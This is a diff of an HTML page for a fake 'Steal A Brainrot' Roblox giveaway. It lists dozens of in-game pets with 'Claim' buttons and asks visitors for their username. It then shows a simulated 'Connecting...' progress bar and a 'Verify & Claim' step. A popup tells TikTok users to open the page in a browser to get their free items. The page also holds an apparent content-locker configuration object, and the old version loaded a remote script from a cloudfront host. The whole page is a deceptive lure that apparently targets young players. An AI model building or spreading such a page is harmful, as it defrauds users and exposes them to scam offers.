@@ -1,260 +1,364 @@
 <!DOCTYPE html>
 <html lang="en">
-   <head>
-      <meta charset="UTF-8">
-      <meta property="og:image" content="https://i.imgur.com/HBaO44H.png">
-      <link rel="shortcut icon" href="https://i.imgur.com/HBaO44H.png" type="image/x-icon">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Steal a Brainrot</title>
-      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/dev20l/tiktok@main/tiktok.css"/>
-      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/dev20l/tiktok@main/tiktak.css"/>
-      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/dev20l/import@main/1.css"/>
-   </head>
-   <body>
-     <script type="text/javascript">
-    var XutFA_jDJ_cHDXZc={"it":4192546,"key":"022fb"};
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steal A Brainrot</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One:wght@400&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="ios-popup" style="display:none">
+        <div class="popup">
+            On <span class="tiktok-icon"></span> you need to tap on the <span class="three-dots"></span> and then tap on <span class="highlight">"Open in browser"</span> to claim your free items.
+        </div>
+    </div>
+    
+    <div id="normal-page" style="display:none">
+        <div id="floating-items-container"></div>
+        <div class="container mx-auto px-4 py-8">
+            <section class="mb-16" id="pets">
+                <div class="blocky-bg rounded-3xl p-6 md:p-10 max-w-2xl mx-auto">
+                    <div style="display: flex; justify-content: center; margin-bottom: 1.5rem;">
+                        <div class="rainbow-banner" style="margin: 0 auto;">
+                            <span class="rainbow-banner-text" style="background: linear-gradient(90deg,);background-size: 400% 400%;animation: rainbow-banner-anim 6s linear infinite;color: #FFFFFF;text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;opacity: 1;">CLAIM YOUR BRAINROT NOW</span>
+                        </div>
+                    </div>
+                    
+                    <ul class="space-y-6">
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://i.postimg.cc/Z5cwW1v3/los-matteos.png" alt="Los Matteos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Los Matteos</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Los Matteos')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://i.postimg.cc/0yv17RWy/job-job-removebg-preview.png" alt="job job job sahur" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">job job job sahur</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('job job job sahur')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/6/6e/Matteo_%28Steal_a_Brainrot%29.webp" alt="Matteo" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Matteo</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Matteo')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://i.ibb.co/1VK1KKp/image-removebg-preview-2.png" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Los Hotspotsitos</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Los Hotspotsitos')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://i.ibb.co/XfT8X1tq/no-my-hotspot-removebg-preview.png" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Nooo My Hotspot</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Nooo My Hotspot')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://i.ibb.co/7xxDNp36/esok-removebg-preview.png" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Esok Sekolah</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Esok Sekolah')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/7/72/Tipi_Topi_Taco.png" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Tipi Topi Taco</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Tipi Topi Taco')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/4/44/Bombardini_Tortinii.png" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Bombardini Tortinii</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Bombardini Tortinii')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/e/ee/Statutino_Libertino_%28Steal_a_Brainrot%29.webp" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Statutino Libertino</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Statutino Libertino')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/3/35/Karkerkarkurkur.png" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Karkerkar kurkur</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Karkerkar kurkur')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-b14aa19aee59dcd2e3fdc474bc8ed42e/420/420/Hat/Webp/noFilter" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">dragon cannelloni</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('dragon cannelloni')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/5/55/Bulbito_Bandito_Traktorito.png" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Bulbito Bandito Traktorito</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Bulbito Bandito Traktorito')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-a06c75cf7c357e4e5ac2ce5b7192268d/420/420/BackAccessory/Webp/noFilter" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Los Combinasionas</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Los Combinasionas')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/3/35/Los_Orcalitos.webp" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Los Orcalitos</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Los Orcalitos')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/f/f8/Trippi_Troppi_Troppa_Trippa.webp" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Trippi Troppi Troppa Trippa</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Trippi Troppi Troppa Trippa')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/8/87/Secret_Lucky_Block_%28Steal_a_Brainrot%29.webp" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Secret Lucky Block</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Secret Lucky Block')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/6/6c/Chicleteira-Bicicleteira.png" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Chicleteira Bicicleteira</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Chicleteira Bicicleteira')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://static.wikia.nocookie.net/stealabr/images/a/a7/Agarrini_La_Palini.webp" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Agarrini La Palini</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Agarrini La Palini')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://image.u4gm.com/storage/steal_a_brainrot/202507/all_server_rainbow_odin_din_din_dun.png" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Rainbow Odin Din Din Dun</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Rainbow Odin Din Din Dun')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://cdn.shopify.com/s/files/1/0837/8712/0919/files/rainbow.png?v=1753068927" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Rainbow Graipuss Medussi</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Rainbow Graipuss Medussi')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://image.u4gm.com/storage/steal_a_brainrot/202507/all_server_rainbow_tralalero_tralala.png" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">Rainbow Tralalero Tralala</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('Rainbow Tralalero Tralala')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-26182675b92f2ad9a61ecae30a2b8ead/420/420/BackAccessory/Webp/noFilter" alt="Los Tralaleritos" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">LOS TRALALERITOS</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('LOS TRALALERITOS')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-08e3120deac49b7bc1227de3932b255c/420/420/Hat/Webp/noFilter" alt="Las Tralaleritas" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">LAS TRALALERITAS</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('LAS TRALALERITAS')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-13af1b4d458233fb3fb4aa49a7ee5520/420/420/WaistAccessory/Webp/noFilter" alt="Tralalero Tralala Lava" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">TRALALERO TRALALA LAVA</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('TRALALERO TRALALA LAVA')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-308310f72b54e617e6039983ffa8987e/420/420/LayeredAccessory/Webp/noFilter" alt="Cocofanto Elefanto" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">COCOFANTO ELEFANTO</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('COCOFANTO ELEFANTO')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-8722139c40ed43ae6cb73b046062ba7f/420/420/Hat/Webp/noFilter" alt="Ballerino Lololo" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">BALLERINO LOLOLO</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('BALLERINO LOLOLO')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-038dd6b56d93422289d07f8f3764d75d/420/420/JacketAccessory/Webp/noFilter" alt="La Vacca Saturno Saturnita" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">LA VACCA SATURNO SATURNITA</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('LA VACCA SATURNO SATURNITA')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-b87295a7d3ed3eb3f8560bb3af747093/420/420/Hat/Webp/noFilter" alt="Nuclearo Dinossauro" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">NUCLEARO DINOSSAURO</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('NUCLEARO DINOSSAURO')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-f4e2a91bab54e236f94b196b48dcdb12/420/420/LayeredAccessory/Png/noFilter" alt="Torrtuginni Dragonfrutini" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">TORRTUGINNI DRAGONFRUTINI</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('TORRTUGINNI DRAGONFRUTINI')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-13ef80ef66437af24e15e6f99fde37e0/420/420/LayeredAccessory/Webp/noFilter" alt="Pot Hotspoto" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">POT HOTSPOT</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('POT HOTSPOTO')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-f34b12c0edcb4df38be51c74445b3b93/420/420/LayeredAccessory/Webp/noFilter" alt="Odin Din Din Dun" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">ODIN DIN DIN DUN</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('ODIN DIN DIN DUN')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-b4771e0464cf7ec27ce1e34803021996/420/420/LayeredAccessory/Webp/noFilter" alt="Graipuss Medussi" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">GRAIPUSS MEDUSSI</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('GRAIPUSS MEDUSSI')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-57fa46e1fdc1ef36467bd6c630058ad3/420/420/JacketAccessory/Webp/noFilter" alt="Brainrot Nuclearo Dinossauro" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">BRAINROT NUCLEARO DINOSSAURO</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('BRAINROT NUCLEARO DINOSSAURO')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://storage.beee.pro/game_items/37270/Sh9PuqZx5DF7j73KDJdHxCNjjHS0GAHBFlF3jvBn.png" alt="Garama and Madundung" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">GARAMA AND MADUNDUNG</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('GARAMA AND MADUNDUNG')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-b14aa19aee59dcd2e3fdc474bc8ed42e/420/420/Hat/Webp/noFilter" alt="Dragon Cannelloni" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">DRAGON CANNELLONI</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('DRAGON CANNELLONI')">Claim</span>
+                        </li>
+
+                        <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                            <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
+                                <img src="https://tr.rbxcdn.com/180DAY-f1a032865ad977022eedb4accebdc3df/420/420/LayeredAccessory/Webp/noFilter" alt="La Grande" class="w-20 h-20 object-contain" />
+                            </div>
+                            <span class="pet-title item-title-glow">LA GRANDE</span>
+                            <span class="claim-pill ml-auto" onclick="openUsernameModal('LA GRANDE')">Claim</span>
+                        </li>
+                    </ul>
+                </div>
+            </section>
+        </div>
+    </div>
+
+    <!-- Username Modal -->
+    <div id="username-modal-backdrop" class="username-modal-backdrop" style="display:none;">
+        <div class="username-modal">
+            <button class="username-modal-close" id="username-modal-close">&times;</button>
+            <div class="username-modal-title">Enter Your Username</div>
+            <div class="username-modal-sub">Please enter your username to claim your brainrot.</div>
+            <input class="username-modal-input" id="username-modal-input" placeholder="Your Username" type="text" />
+            <div class="username-modal-error" id="username-modal-error"></div>
+            <button class="username-modal-btn" id="username-modal-btn">Submit</button>
+        </div>
+    </div>
+
+    <!-- Generator Modal -->
+    <div id="generator-modal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-60 z-50 hidden">
+        <div class="modal-content p-8 rounded-2xl max-w-md w-full text-center relative">
+            <div id="generator-title" class="text-2xl font-bold mb-4 pulse-title">Connecting...</div>
+            <img id="loading-item-img" src="" alt="Item" class="mx-auto mb-4 w-24 h-24 object-contain" style="display:none;">
+            <div class="progress-bar mb-4">
+                <div id="progress-fill" class="progress-fill" style="width:0%">0%</div>
+            </div>
+            <div id="game-tip" class="mb-4 text-lg text-dark"></div>
+            <button id="verify-btn" class="green-claim-button w-full py-3 text-xl hidden">Verify & Claim</button>
+        </div>
+    </div>
+
+    <!-- Winner Popup -->
+    <div id="winner-popup" style="display:none; position:fixed; left:50%; bottom:32px; transform:translateX(-50%); z-index:9999; min-width:320px; max-width:90vw; background:rgba(0,0,0,0.5); color:#fff; font-family:'Fredoka One',cursive; font-size:0.98rem; border-radius:2.2rem; box-shadow:0 2px 12px #0008; padding:0.35rem 2.2rem; pointer-events:none; border:2px solid #43d13b; height:auto; display:flex; align-items:center; gap:16px;">
+        <div id="winner-popup-icon"></div>
+        <span id="winner-popup-content" style="text-align:left;display:block;"></span>
+    </div>
+
+    <script type="text/javascript">
+    var DbQvQ_asS_UbGZDc={"it":4532005,"key":"bf496"};
 </script>
-<script src="https://dlk457skl57zp.cloudfront.net/06a5b4b.js"></script>
-      <div class="loading">
-         <div class="load">
-            <img src="https://i.imgur.com/MjVLeNt.gif" alt="loading gif" />
-         </div>
-      </div>
-      <nav>
-         <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Roblox_Logo_2022.svg/1200px-Roblox_Logo_2022.svg.png" alt="">
-         </div>
-      </nav>
-      <div class="container-md">
-         <div class="label">
-            <div class="item active">Items</div>
-            <div class="item">Robux</div>
-            <div class="item">Info</div>
-         </div>
-         <div id="gifts" class="gifts">
-            <div class="row">
-            </div>
-            <br>
-            <br>
-            <br>
-         </div>
-         <div id="followers" class="followers d-none">
-            <div class="row">
-               <div class="col-4 col-md-3">
-                  <div class="item">
-                     <div class="txt">100</div>
-                     <div class="img"><img src="https://i.imgur.com/HBaO44H.png" alt=""></div>
-                  </div>
-               </div>
-               <div class="col-4 col-md-3">
-                  <div class="item">
-                     <div class="txt">500</div>
-                     <div class="img"><img src="https://i.imgur.com/HBaO44H.png" alt=""></div>
-                  </div>
-               </div>
-               <div class="col-4 col-md-3">
-                  <div class="item">
-                     <div class="txt">1000</div>
-                     <div class="img"><img src="https://i.imgur.com/HBaO44H.png" alt=""></div>
-                  </div>
-               </div>
-               <div class="col-4 col-md-3">
-                  <div class="item">
-                     <div class="txt">2000</div>
-                     <div class="img"><img src="https://i.imgur.com/HBaO44H.png" alt=""></div>
-                  </div>
-               </div>
-               <div class="col-4 col-md-3">
-                  <div class="item">
-                     <div class="txt">5000</div>
-                     <div class="img"><img src="https://i.imgur.com/HBaO44H.png" alt=""></div>
-                  </div>
-               </div>
-               <div class="col-4 col-md-3">
-                  <div class="item">
-                     <div class="txt">8000</div>
-                     <div class="img"><img src="https://i.imgur.com/HBaO44H.png" alt=""></div>
-                  </div>
-               </div>
-               <div class="col-4 col-md-3">
-                  <div class="item">
-                     <div class="txt">10000</div>
-                     <div class="img"><img src="https://i.imgur.com/HBaO44H.png" alt=""></div>
-                  </div>
-               </div>
-               <div class="col-4 col-md-3">
-                  <div class="item">
-                     <div class="txt">12000</div>
-                     <div class="img"><img src="https://i.imgur.com/HBaO44H.png" alt=""></div>
-                  </div>
-               </div>
-               <div class="col-4 col-md-3">
-                  <div class="item">
-                     <div class="txt">20000</div>
-                     <div class="img"><img src="https://i.imgur.com/HBaO44H.png" alt=""></div>
-                  </div>
-               </div>
-            </div>
-            <br>
-            <br>
-            <br>
-         </div>
-         <div id="coins" class="coins d-none">
-            <div class="row">
-            </div>
-            <br>
-            <br>
-            <br>
-         </div>
-         <div id="last" class="last d-none">
-            <div class="search">
-               <input placeholder="Enter Username">
-               <button id="search">search</button>
-            </div>
-            <div class="profile d-none">
-               <div class="img"><img src=""></div>
-               <div class="username">@username</div>
-               <div class="more">
-                  <div class="item">
-                  </div>
-                  <div class="item">
-                  </div>
-                  <div class="item">
-                  </div>
-               </div>
-            </div>
-            <div class="rewards d-none">
-               <div class="gifts">Items : </div>
-               <div class="imgs">
-                  <img src="" alt="">
-                  <img src="" alt="">
-                  <img src=""alt="">
-                  <img src="" alt="">
-               </div>
-               <div class="item">
-                  <div>Robux : </div>
-                  <div id="follow-val">+1k</div>
-               </div>
-               <div class="item">
-               </div>
-            </div>
-            <div class="no-user d-none">
-               <div class="img">
-                  <svg width="72" data-e2e="" height="72" viewBox="0 0 72 72" fill="currentColor" xmlns="http://www.w3.org/2000/svg" style="fill-opacity: 0.34;">
-                     <path fill-rule="evenodd" clip-rule="evenodd" d="M16.6276 20.2241C16.6276 30.8074 25.2394 39.4192 35.8227 39.4192C46.4059 39.4192 55.0178 30.8074 55.0178 20.2241C55.0178 9.64086 46.4059 1.02899 35.8227 1.02899C25.2394 1.02899 16.6276 9.64086 16.6276 20.2241ZM19.7405 20.2244C19.7405 11.3583 26.9568 4.14202 35.8229 4.14202C44.689 4.14202 51.9053 11.3583 51.9053 20.2244C51.9053 29.0905 44.689 36.3068 35.8229 36.3068C26.9568 36.3068 19.7405 29.0905 19.7405 20.2244Z"></path>
